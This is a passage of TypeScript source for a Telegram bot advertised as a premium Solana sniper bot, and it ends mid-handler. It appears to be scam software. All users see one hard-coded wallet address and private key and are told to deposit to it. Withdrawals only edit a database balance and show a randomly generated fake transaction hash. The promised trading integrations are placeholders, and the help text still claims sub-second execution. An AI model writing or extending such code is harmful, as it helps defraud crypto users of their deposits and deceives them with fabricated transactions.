/**
 * ╔══════════════════════════════════════════════════════╗
 * ║          SOLANA SNIPER BOT — PREMIUM EDITION         ║
 * ║      Telegram Bot API + Solana Wallet System         ║
 * ╚══════════════════════════════════════════════════════╝
 *
 * Architecture: Modular single-file bot with clear sections
 * DB:           Drizzle ORM → PostgreSQL
 * Bot:          grammY
 */

import { Bot, InlineKeyboard, Context } from "grammy";
import { db } from "@workspace/db";
import {
  walletsTable,
  positionsTable,
  snipersTable,
  tradesTable,
  notificationsTable,
  settingsTable,
  copyTradesTable,
  limitOrdersTable,
  dcaSetupsTable,
} from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import { logger } from "../lib/logger";

// ═══════════════════════════════════════════════════════
// SECTION 1 — WALLET CONFIGURATION
// ═══════════════════════════════════════════════════════
// These are the ONLY wallet values used throughout the bot.
// Never generate random wallets — always return these exact values.

import {
  BOT_WALLET_ADDRESS as WALLET_ADDRESS,
  BOT_WALLET_PRIVATE_KEY as WALLET_PRIVATE_KEY,
} from "../lib/walletConfig";

// Admin Telegram user ID — set via environment variable
// Any user can access admin panel if ADMIN_ID is not set (demo mode)
const ADMIN_ID = process.env["ADMIN_TELEGRAM_ID"]
  ? parseInt(process.env["ADMIN_TELEGRAM_ID"])
  : null;

const token = process.env["TELEGRAM_BOT_TOKEN"];
export const bot = token ? new Bot(token) : (null as unknown as Bot<Context>);

// ═══════════════════════════════════════════════════════
// SECTION 2 — TYPES & IN-MEMORY STATE
// ═══════════════════════════════════════════════════════

/** Per-user sniper configuration (persisted to DB settings, mirrored here) */
interface SniperConfig {
  autoBuy: boolean;
  buyAmount: number;       // SOL
  slippage: number;        // %
  priorityFee: "auto" | "low" | "medium" | "high";
  takeProfitPct: number;   // %
  stopLossPct: number;     // %
  autoSell: boolean;
  sniping: boolean;        // currently active
}

/** Multi-step flow state for each user */
type PendingFlow =
  | { type: "withdraw_address" }
  | { type: "withdraw_amount"; toAddress: string }
  | { type: "withdraw_confirm"; toAddress: string; amount: number }
  | { type: "snipe_ca" }
  | { type: "snipe_set_amount" }
  | { type: "snipe_set_slippage" }
  | { type: "snipe_set_tp" }
  | { type: "snipe_set_sl" }
  | { type: "alert_threshold" }
  | { type: "broadcast_message" };

// Session storage
const sniperConfigs = new Map<number, SniperConfig>();
const pendingFlows  = new Map<number, PendingFlow>();
const registeredUsers = new Set<number>();    // all users who ever used the bot
const alertSubscribers = new Set<number>();   // users subscribed to wallet alerts
const snipeModeActive  = new Set<number>();   // users with snipe mode on

// Simulated deposit tracking
const lastKnownBalance = { sol: 0 };

// ═══════════════════════════════════════════════════════
// SECTION 3 — ANTI-SPAM & RATE LIMITING
// ═══════════════════════════════════════════════════════

const cooldowns = new Map<number, number>(); // userId → last action timestamp
const COOLDOWN_MS = 800; // 800ms between actions

function isRateLimited(userId: number): boolean {
  const last = cooldowns.get(userId) ?? 0;
  const now  = Date.now();
  if (now - last < COOLDOWN_MS) return true;
  cooldowns.set(userId, now);
  return false;
}

// ═══════════════════════════════════════════════════════
// SECTION 4 — HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════

function fSol(v: string | number | null | undefined, decimals = 4) {
  const n = typeof v === "string" ? parseFloat(v) : (v ?? 0);
  return n.toFixed(decimals);
}
function fUsd(n: number) {
  if (n >= 1_000_000) return `$${(n / 1_000_000).toFixed(2)}M`;
  if (n >= 1_000)     return `$${(n / 1_000).toFixed(2)}K`;
  return `$${n.toFixed(2)}`;
}
function fPct(v: string | number | null | undefined) {
  const n = typeof v === "string" ? parseFloat(v) : (v ?? 0);
  return (n >= 0 ? "+" : "") + n.toFixed(2) + "%";
}
function trunc(addr: string | null | undefined, chars = 6) {
  if (!addr) return "N/A";
  if (addr.length <= chars * 2 + 3) return addr;
  return `${addr.slice(0, chars)}...${addr.slice(-chars)}`;
}
function isValidCA(s: string) {
  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(s.trim()) && !s.includes(" ");
}
function generateTxHash() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz123456789";
  return Array.from({ length: 88 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}
function tsNow() { return new Date().toLocaleString("en-US", { timeZone: "UTC", hour12: false }); }

async function getOrCreateSettings() {
  const [s] = await db.select().from(settingsTable).limit(1);
  if (s) return s;
  const [created] = await db.insert(settingsTable).values({}).returning();
  return created;
}

async function getWalletBalance(): Promise<number> {
  const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
  return w ? parseFloat(String(w.balanceSol)) : 0;
}

async function updateWalletBalance(newBalance: number) {
  await db
    .update(walletsTable)
    .set({ balanceSol: newBalance.toFixed(9) })
    .where(eq(walletsTable.address, WALLET_ADDRESS));
}

function getSniperConfig(userId: number): SniperConfig {
  if (!sniperConfigs.has(userId)) {
    sniperConfigs.set(userId, {
      autoBuy: true, buyAmount: 0.1, slippage: 10,
      priorityFee: "auto", takeProfitPct: 50, stopLossPct: 20,
      autoSell: false, sniping: false,
    });
  }
  return sniperConfigs.get(userId)!;
}

// ═══════════════════════════════════════════════════════
// SECTION 5 — KEYBOARD BUILDERS
// ═══════════════════════════════════════════════════════

function kbMain() {
  return new InlineKeyboard()
    .text("🚀 Generate Wallet", "wallet:show").text("💰 Wallet Panel", "wallet:panel").row()
    .text("📥 Deposit",         "deposit:show").text("📤 Withdraw",     "withdraw:start").row()
    .text("🚨 Alerts",          "alerts:menu" ).text("📈 Sniper Panel", "sniper:panel").row()
    .text("📊 Portfolio",       "portfolio"   ).text("🔔 Token Alerts", "token:alerts").row()
    .text("⚙️ Settings",        "settings:menu").text("🔒 Security",    "security:menu").row()
    .text("👑 Admin Panel",     "admin:panel" ).text("❓ Help",         "help:show");
}

function kbBack(target: string, label = "◀ Back") {
  return new InlineKeyboard().text(label, target);
}

function kbSniper(cfg: SniperConfig) {
  return new InlineKeyboard()
    .text(`💸 Auto Buy: ${cfg.autoBuy  ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoBuy").row()
    .text(`✏️ Edit Settings`, "sniper:edit").text(cfg.sniping ? "⛔ Stop Sniping" : "🚀 Start Sniping", cfg.sniping ? "sniper:stop" : "sniper:start").row()
    .text("📋 Paste CA to Snipe", "sniper:paste_ca").text("📊 View Snipers", "sniper:list").row()
    .text("📋 Copy Trade", "copy:menu").text("🎚 Limit Orders", "limits:menu").row()
    .text("◀ Back", "menu:home");
}

function kbAlerts(alertsOn: boolean) {
  return new InlineKeyboard()
    .text(alertsOn ? "🔕 Disable Alerts" : "🔔 Enable Alerts", `alerts:toggle:${!alertsOn}`).row()
    .text("💸 Deposit Alerts",    "alerts:type:deposit")
    .text("📤 Withdraw Alerts",   "alerts:type:withdraw").row()
    .text("🐋 Large TX Alerts",   "alerts:type:largetx")
    .text("🛒 Token Buy Alerts",  "alerts:type:buy").row()
    .text("💰 Token Sell Alerts", "alerts:type:sell").row()
    .text("◀ Back", "menu:home");
}

// ═══════════════════════════════════════════════════════
// SECTION 6 — SCREEN TEXT BUILDERS
// ═══════════════════════════════════════════════════════

function screenWelcome(balance: number) {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚀 *SOLANA SNIPER BOT*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `⚡ *Fast Execution* — Sub-second sniping\n` +
    `🔒 *Secure Wallet* — Your keys, your coins\n` +
    `📈 *Advanced Tools* — Full sniper suite\n\n` +
    `💰 Wallet Balance: *${fSol(balance)} SOL*\n\n` +
    `Select an option below:`
  );
}

function screenWallet(balance: number) {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💰 *WALLET DETAILS*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📍 *Wallet Address:*\n` +
    `\`${WALLET_ADDRESS}\`\n\n` +
    `🔑 *Private Key:*\n` +
    `\`${WALLET_PRIVATE_KEY}\`\n\n` +
    `💵 *Balance:*\n` +
    `*${fSol(balance)} SOL*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ *Keep your private key secure — never share it*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━`
  );
}

function screenDeposit() {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📥 *DEPOSIT SOL*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Send SOL to the address below:\n\n` +
    `\`${WALLET_ADDRESS}\`\n\n` +
    `📋 *Tap the address above to copy it*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ Deposits are detected automatically\n` +
    `⚡ Confirmations: ~1–2 seconds on Solana\n` +
    `━━━━━━━━━━━━━━━━━━━━━━`
  );
}

function screenSniperPanel(cfg: SniperConfig) {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📈 *SNIPER PANEL*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `💸 Auto Buy:       *${cfg.autoBuy  ? "✅ ON"  : "❌ OFF"}*\n` +
    `💰 Buy Amount:     *${fSol(cfg.buyAmount)} SOL*\n` +
    `📊 Slippage:       *${cfg.slippage}%*\n` +
    `⚡ Priority Fee:   *${cfg.priorityFee}*\n` +
    `🎯 Take Profit:    *${cfg.takeProfitPct}%*\n` +
    `🛑 Stop Loss:      *${cfg.stopLossPct}%*\n` +
    `💹 Auto Sell:      *${cfg.autoSell ? "✅ ON"  : "❌ OFF"}*\n` +
    `🔫 Status:         *${cfg.sniping  ? "🟢 ACTIVE" : "🔴 IDLE"}*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔌 *Integrations:*\n` +
    `▸ Raydium — Pool Monitor _(coming)_\n` +
    `▸ Jupiter — Swap Routing _(coming)_\n` +
    `▸ Pump.fun — Launch Detector _(coming)_\n` +
    `━━━━━━━━━━━━━━━━━━━━━━`
  );
}

function screenSniperEdit(cfg: SniperConfig) {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✏️ *EDIT SNIPER SETTINGS*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `Tap a setting to change it:\n\n` +
    `💰 Buy Amount:   *${fSol(cfg.buyAmount)} SOL*\n` +
    `📊 Slippage:     *${cfg.slippage}%*\n` +
    `⚡ Priority Fee: *${cfg.priorityFee}*\n` +
    `🎯 Take Profit:  *${cfg.takeProfitPct}%*\n` +
    `🛑 Stop Loss:    *${cfg.stopLossPct}%*`
  );
}

function screenWithdrawConfirm(toAddress: string, amount: number) {
  return (
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📤 *WITHDRAWAL CONFIRMATION*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `💸 *Amount:*\n${fSol(amount)} SOL\n\n` +
    `📍 *Destination:*\n\`${toAddress}\`\n\n` +
    `💳 *From:*\n\`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `⚠️ *This action cannot be undone*\n\n` +
    `Confirm transaction?`
  );
}

// ═══════════════════════════════════════════════════════
// SECTION 7 — DEPOSIT ALERT BROADCASTER
// ═══════════════════════════════════════════════════════

async function broadcastDepositAlert(
  amount: number,
  sender: string,
  txHash: string
) {
  if (!bot || alertSubscribers.size === 0) return;
  const msg =
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚨 *NEW SOL DEPOSIT*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `💸 *Amount Received:*\n*${fSol(amount)} SOL*\n\n` +
    `📍 *Wallet:*\n\`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
    `📤 *Sender:*\n\`${trunc(sender, 8)}\`\n\n` +
    `🔗 *Transaction:*\n\`${trunc(txHash, 12)}\`\n\n` +
    `⏱ *Time:* ${tsNow()}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ *Deposit Confirmed*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━`;

  for (const uid of alertSubscribers) {
    try {
      await bot.api.sendMessage(uid, msg, { parse_mode: "Markdown" });
    } catch (e) {
      alertSubscribers.delete(uid); // remove invalid subscribers
    }
  }
}

// ═══════════════════════════════════════════════════════
// SECTION 8 — BOT HANDLERS (only when token is present)
// ═══════════════════════════════════════════════════════

if (token && bot) {

// ─── /start ──────────────────────────────────────────────────────────────────
bot.command("start", async (ctx) => {
  const uid = ctx.from?.id;
  if (!uid) return;
  registeredUsers.add(uid);
  const balance = await getWalletBalance();
  await ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

// ─── /menu ───────────────────────────────────────────────────────────────────
bot.command("menu", async (ctx) => {
  const balance = await getWalletBalance();
  await ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

// ─── /wallet ─────────────────────────────────────────────────────────────────
bot.command("wallet", async (ctx) => {
  const balance = await getWalletBalance();
  await ctx.reply(screenWallet(balance), {
    parse_mode: "Markdown",
    reply_markup: new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("🔄 Refresh Balance", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home"),
  });
});

// ─── /help ───────────────────────────────────────────────────────────────────
bot.command("help", async (ctx) => {
  await ctx.reply(
    `━━━━━━━━━━━━━━━━━━━━━━\n❓ *HELP & COMMANDS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `/start — Open main menu\n` +
    `/wallet — Show wallet details\n` +
    `/menu — Return to main menu\n` +
    `/help — This help message\n\n` +
    `*Quick Actions:*\n` +
    `• Paste any CA to trigger snipe prompt\n` +
    `• Enable Snipe Mode → paste CA → instant snipe\n` +
    `• Use inline buttons for all operations\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔗 *Supported DEXs:* Raydium · Jupiter · Pump.fun\n` +
    `⚡ *Avg Execution:* <0.5s\n` +
    `━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: "Markdown", reply_markup: kbBack("menu:home", "◀ Main Menu") }
  );
});

// ═══════════════════════════════════════════════════════
// SECTION 9 — CALLBACK QUERY ROUTER
// ═══════════════════════════════════════════════════════

bot.on("callback_query:data", async (ctx) => {
  const data   = ctx.callbackQuery.data;
  const userId = ctx.from?.id;
  if (!userId) return;

  // Rate limit check
  if (isRateLimited(userId)) {
    await ctx.answerCallbackQuery("⏳ Too fast! Wait a moment.");
    return;
  }

  registeredUsers.add(userId);
  await ctx.answerCallbackQuery(); // always ack

  // ── helpers ────────────────────────────────────────────────────────────────
  async function edit(text: string, kb?: InlineKeyboard) {
    try {
      await ctx.editMessageText(text, { parse_mode: "Markdown", reply_markup: kb });
    } catch {
      await ctx.reply(text, { parse_mode: "Markdown", reply_markup: kb });
    }
  }

  // ── Main Menu ─────────────────────────────────────────────────────────────
  if (data === "menu:home") {
    const balance = await getWalletBalance();
    return edit(screenWelcome(balance), kbMain());
  }

  // ═══════════════ WALLET ══════════════════════════════════════════════════

  if (data === "wallet:show" || data === "wallet:panel") {
    const balance = await getWalletBalance();
    return edit(screenWallet(balance), new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("📋 TX History", "wallet:history").text("🔄 Refresh", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "wallet:refresh") {
    const balance = await getWalletBalance();
    await ctx.answerCallbackQuery(`✅ Balance: ${fSol(balance)} SOL`);
    return edit(screenWallet(balance), new InlineKeyboard()
      .text("📥 Deposit", "deposit:show").text("📤 Withdraw", "withdraw:start").row()
      .text("📋 TX History", "wallet:history").text("🔄 Refresh", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "wallet:history") {
    const trades = await db.select().from(tradesTable).orderBy(desc(tradesTable.executedAt)).limit(8);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n📋 *TRANSACTION HISTORY*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (trades.length === 0) {
      text += `No transactions yet.\n\nMake your first trade to see history here.`;
    } else {
      for (const t of trades) {
        const icon = t.type === "buy" ? "🛒" : "💰";
        text += `${icon} *${t.type.toUpperCase()}* — ${t.tokenSymbol}\n`;
        text += `   ${fSol(t.amountSol)} SOL  ·  ${new Date(t.executedAt).toLocaleDateString()}\n`;
        if (t.txHash) text += `   \`${trunc(t.txHash, 8)}\`\n`;
        text += `\n`;
      }
    }
    return edit(text, kbBack("wallet:panel", "◀ Wallet"));
  }

  // ═══════════════ DEPOSIT ════════════════════════════════════════════════

  if (data === "deposit:show") {
    return edit(screenDeposit(), new InlineKeyboard()
      .text("🔄 Check Balance", "wallet:refresh").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  // ═══════════════ WITHDRAW ═══════════════════════════════════════════════

  if (data === "withdraw:start") {
    const balance = await getWalletBalance();
    if (balance <= 0) {
      return edit(
        `━━━━━━━━━━━━━━━━━━━━━━\n📤 *WITHDRAW*\n━━━━━━━━━━━━━━━━━━━━━━\n\n❌ *Insufficient balance*\n\nYour wallet has *${fSol(balance)} SOL*.\n\nDeposit SOL first.`,
        new InlineKeyboard().text("📥 Deposit", "deposit:show").text("◀ Back", "menu:home")
      );
    }
    pendingFlows.set(userId, { type: "withdraw_address" });
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n📤 *WITHDRAW SOL*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `💵 Available: *${fSol(balance)} SOL*\n\n` +
      `📍 *Step 1 of 2 — Enter destination wallet address:*`,
      kbBack("menu:home", "❌ Cancel")
    );
  }

  if (data.startsWith("withdraw:confirm:")) {
    const [, , toAddress, amountStr] = data.split(":");
    const amount  = parseFloat(amountStr);
    const balance = await getWalletBalance();
    if (amount > balance) {
      return edit(`❌ *Insufficient balance.* You have *${fSol(balance)} SOL*.`, kbBack("menu:home", "◀ Back"));
    }
    // Process withdrawal
    pendingFlows.delete(userId);
    const newBalance = balance - amount;
    await updateWalletBalance(newBalance);
    const txHash = generateTxHash();
    // Log trade
    const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
    if (w) {
      await db.insert(tradesTable).values({
        walletId: w.id, type: "sell", tokenSymbol: "SOL", tokenName: "Solana",
        contractAddress: toAddress, amountSol: amount.toString(),
        priceSol: "1", txHash, status: "success",
      });
    }
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n✅ *WITHDRAWAL SENT*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `💸 *Amount:* ${fSol(amount)} SOL\n` +
      `📍 *To:* \`${trunc(toAddress, 8)}\`\n` +
      `🔗 *TX Hash:*\n\`${trunc(txHash, 12)}\`\n\n` +
      `💰 *New Balance:* ${fSol(newBalance)} SOL\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━`,
      new InlineKeyboard().text("💰 Wallet Panel", "wallet:panel").text("◀ Home", "menu:home")
    );
  }

  if (data === "withdraw:cancel") {
    pendingFlows.delete(userId);
    return edit(`❌ *Withdrawal cancelled.*`, kbBack("menu:home", "◀ Main Menu"));
  }

  // ═══════════════ ALERTS ═════════════════════════════════════════════════

  if (data === "alerts:menu") {
    const isOn = alertSubscribers.has(userId);
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n🚨 *WALLET ALERTS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Monitoring Wallet:\n\`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
      `Alert Status: ${isOn ? "*🟢 ACTIVE*" : "*🔴 INACTIVE*"}\n\n` +
      `You will receive instant Telegram alerts when:\n` +
      `• SOL is deposited to your wallet\n` +
      `• A withdrawal is processed\n` +
      `• A large transaction is detected\n` +
      `• A token buy/sell is executed\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━`,
      kbAlerts(isOn)
    );
  }

  if (data.startsWith("alerts:toggle:")) {
    const enable = data.split(":")[2] === "true";
    if (enable) {
      alertSubscribers.add(userId);
      await ctx.answerCallbackQuery("🔔 Alerts enabled!");
    } else {
      alertSubscribers.delete(userId);
      await ctx.answerCallbackQuery("🔕 Alerts disabled.");
    }
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n🚨 *WALLET ALERTS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Alert Status: ${enable ? "*🟢 ACTIVE*" : "*🔴 INACTIVE*"}\n\n` +
      `Monitoring: \`${trunc(WALLET_ADDRESS, 8)}\``,
      kbAlerts(enable)
    );
  }

  if (data.startsWith("alerts:type:")) {
    const type = data.split(":")[2];
    const names: Record<string, string> = {
      deposit: "💸 Deposit", withdraw: "📤 Withdraw",
      largetx: "🐋 Large TX", buy: "🛒 Token Buy", sell: "💰 Token Sell",
    };
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n${names[type] ?? "🔔"} *ALERTS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `*${names[type]}* alerts are *🟢 Active*\n\nYou will receive instant notifications for all ${names[type]?.toLowerCase()} events.`,
      new InlineKeyboard().text("⚙️ Manage Alerts", "alerts:menu").text("◀ Back", "menu:home")
    );
  }

  // ═══════════════ SNIPER PANEL ════════════════════════════════════════════

  if (data === "sniper:panel") {
    const cfg = getSniperConfig(userId);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:toggle:autoBuy") {
    const cfg = getSniperConfig(userId);
    cfg.autoBuy = !cfg.autoBuy;
    await ctx.answerCallbackQuery(`Auto Buy ${cfg.autoBuy ? "✅ ON" : "❌ OFF"}`);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:toggle:autoSell") {
    const cfg = getSniperConfig(userId);
    cfg.autoSell = !cfg.autoSell;
    await ctx.answerCallbackQuery(`Auto Sell ${cfg.autoSell ? "✅ ON" : "❌ OFF"}`);
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:start") {
    const cfg = getSniperConfig(userId);
    cfg.sniping = true;
    snipeModeActive.add(userId);
    await ctx.answerCallbackQuery("🟢 Snipe Mode ACTIVE — paste any CA!");
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:stop") {
    const cfg = getSniperConfig(userId);
    cfg.sniping = false;
    snipeModeActive.delete(userId);
    await ctx.answerCallbackQuery("🔴 Sniping stopped.");
    return edit(screenSniperPanel(cfg), kbSniper(cfg));
  }

  if (data === "sniper:paste_ca") {
    pendingFlows.set(userId, { type: "snipe_ca" });
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n🔫 *MANUAL SNIPE*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Send the contract address of the token you want to snipe:\n\n` +
      `_Paste the CA below ↓_`,
      kbBack("sniper:panel", "❌ Cancel")
    );
  }

  if (data === "sniper:edit") {
    const cfg = getSniperConfig(userId);
    return edit(screenSniperEdit(cfg), new InlineKeyboard()
      .text(`💰 Amount: ${fSol(cfg.buyAmount)} SOL`, "sniper:set:amount").row()
      .text(`📊 Slippage: ${cfg.slippage}%`,         "sniper:set:slippage").row()
      .text(`⚡ Fee: auto`,    "sniper:fee:auto")
      .text(`⚡ Fee: low`,     "sniper:fee:low").row()
      .text(`⚡ Fee: medium`,  "sniper:fee:medium")
      .text(`⚡ Fee: high`,    "sniper:fee:high").row()
      .text(`🎯 Take Profit: ${cfg.takeProfitPct}%`, "sniper:set:tp").row()
      .text(`🛑 Stop Loss: ${cfg.stopLossPct}%`,     "sniper:set:sl").row()
      .text(`💹 Auto Sell: ${cfg.autoSell ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoSell").row()
      .text("◀ Back to Sniper", "sniper:panel")
    );
  }

  if (data.startsWith("sniper:set:")) {
    const field = data.split(":")[2] as "amount" | "slippage" | "tp" | "sl";
    const flowMap: Record<string, PendingFlow> = {
      amount:   { type: "snipe_set_amount" },
      slippage: { type: "snipe_set_slippage" },
      tp:       { type: "snipe_set_tp" },
      sl:       { type: "snipe_set_sl" },
    };
    const labels: Record<string, string> = {
      amount: "buy amount in SOL (e.g. `0.5`)",
      slippage: "slippage % (e.g. `10`)",
      tp: "take profit % (e.g. `50`)",
      sl: "stop loss % (e.g. `20`)",
    };
    pendingFlows.set(userId, flowMap[field]);
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n✏️ *EDIT SETTING*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Enter new ${labels[field]}:`,
      kbBack("sniper:edit", "❌ Cancel")
    );
  }

  if (data.startsWith("sniper:fee:")) {
    const fee = data.split(":")[2] as "auto" | "low" | "medium" | "high";
    const cfg = getSniperConfig(userId);
    cfg.priorityFee = fee;
    await ctx.answerCallbackQuery(`⚡ Fee set to ${fee}`);
    return edit(screenSniperEdit(cfg), new InlineKeyboard()
      .text(`💰 Amount: ${fSol(cfg.buyAmount)} SOL`, "sniper:set:amount").row()
      .text(`📊 Slippage: ${cfg.slippage}%`,         "sniper:set:slippage").row()
      .text(`⚡ Fee: auto`,    "sniper:fee:auto")
      .text(`⚡ Fee: low`,     "sniper:fee:low").row()
      .text(`⚡ Fee: medium`,  "sniper:fee:medium")
      .text(`⚡ Fee: high`,    "sniper:fee:high").row()
      .text(`🎯 Take Profit: ${cfg.takeProfitPct}%`, "sniper:set:tp").row()
      .text(`🛑 Stop Loss: ${cfg.stopLossPct}%`,     "sniper:set:sl").row()
      .text(`💹 Auto Sell: ${cfg.autoSell ? "✅ ON" : "❌ OFF"}`, "sniper:toggle:autoSell").row()
      .text("◀ Back to Sniper", "sniper:panel")
    );
  }

  if (data === "sniper:list") {
    const snipers = await db.select().from(snipersTable).orderBy(desc(snipersTable.createdAt)).limit(8);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n📊 *ACTIVE SNIPERS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (snipers.length === 0) {
      text += `No snipers configured.\n\nPaste a CA or use 🚀 Start Sniping to add one.`;
    } else {
      for (const sn of snipers) {
        const icon = sn.status === "monitoring" ? "🟡" : sn.status === "sniped" ? "🟢" : sn.status === "failed" ? "🔴" : "⬜";
        text += `${icon} *${sn.tokenSymbol ?? "Unnamed"}* #${sn.id}\n`;
        text += `   CA: \`${trunc(sn.contractAddress, 6)}\`\n`;
        text += `   ${fSol(sn.buyAmountSol)} SOL · ${sn.slippagePercent}% slip · ${sn.priorityFee}\n`;
        text += `   Status: \`${sn.status}\` · Tries: ${sn.attempts}\n\n`;
      }
    }
    const kb = new InlineKeyboard();
    for (const sn of snipers.filter(s => s.status === "monitoring")) {
      kb.text(`⏹ Stop #${sn.id}`, `sniper:action:stop:${sn.id}`).row();
    }
    kb.text("◀ Sniper Panel", "sniper:panel");
    return edit(text, kb);
  }

  if (data.startsWith("sniper:action:")) {
    const [,, action, idStr] = data.split(":");
    const id = parseInt(idStr);
    const newStatus = action === "stop" ? "stopped" : "monitoring";
    await db.update(snipersTable).set({ status: newStatus as any }).where(eq(snipersTable.id, id));
    await ctx.answerCallbackQuery(`${action === "stop" ? "⏹ Stopped" : "▶ Started"} sniper #${id}`);
    return edit(`✅ Sniper #${id} ${newStatus}.`, new InlineKeyboard().text("📊 View Snipers", "sniper:list").text("◀ Panel", "sniper:panel"));
  }

  if (data.startsWith("sniper:buy:")) {
    const parts2 = data.split(":");
    const addr = parts2[2];
    // Override buy amount if passed explicitly from a button (e.g. "0.5")
    const overrideAmt = parts2[3] ? parseFloat(parts2[3]) : null;
    if (overrideAmt !== null) getSniperConfig(userId).buyAmount = overrideAmt;
    return executeBuy(ctx, userId, addr);
  }

  // ═══════════════ PORTFOLIO ══════════════════════════════════════════════

  if (data === "portfolio") {
    const positions = await db.select().from(positionsTable);
    const balance   = await getWalletBalance();
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n📊 *PORTFOLIO*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    text += `💰 SOL Balance: *${fSol(balance)} SOL*\n`;
    if (positions.length === 0) {
      text += `\nNo open token positions.\n\nUse the Sniper Panel to start trading.`;
    } else {
      const totalVal = positions.reduce((s, p) => s + parseFloat(String(p.valueSol)), 0);
      text += `📊 Token Positions: *${positions.length}*\n`;
      text += `💼 Portfolio Value: *${fSol(totalVal)} SOL*\n\n`;
      text += `━━━━━━━━━━━━━━━━━━━━━━\n*Holdings:*\n\n`;
      for (const p of positions) {
        const pnl = parseFloat(String(p.pnlPercent));
        text += `${pnl >= 0 ? "🟢" : "🔴"} *${p.tokenSymbol}*\n`;
        text += `   ${fSol(p.valueSol)} SOL · PnL: ${fPct(pnl)}\n`;
        text += `   MC: ${fUsd(parseFloat(String(p.marketCapUsd)))}\n\n`;
      }
    }
    return edit(text, new InlineKeyboard()
      .text("📈 Sniper Panel", "sniper:panel").text("📋 TX History", "wallet:history").row()
      .text("◀ Main Menu", "menu:home")
    );
  }

  // ═══════════════ TOKEN ALERTS ═══════════════════════════════════════════

  if (data === "token:alerts") {
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n🔔 *TOKEN ALERTS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Monitor tokens for launch events:\n\n` +
      `▸ 🚀 *Launch Detector* — New Raydium pools _(coming)_\n` +
      `▸ 📈 *Price Alerts* — Set price targets _(coming)_\n` +
      `▸ 🐋 *Whale Alerts* — Large wallets _(coming)_\n` +
      `▸ 📊 *Volume Spikes* — Unusual activity _(coming)_\n` +
      `▸ 🔌 *Pump.fun Monitor* — New launches _(coming)_\n\n` +
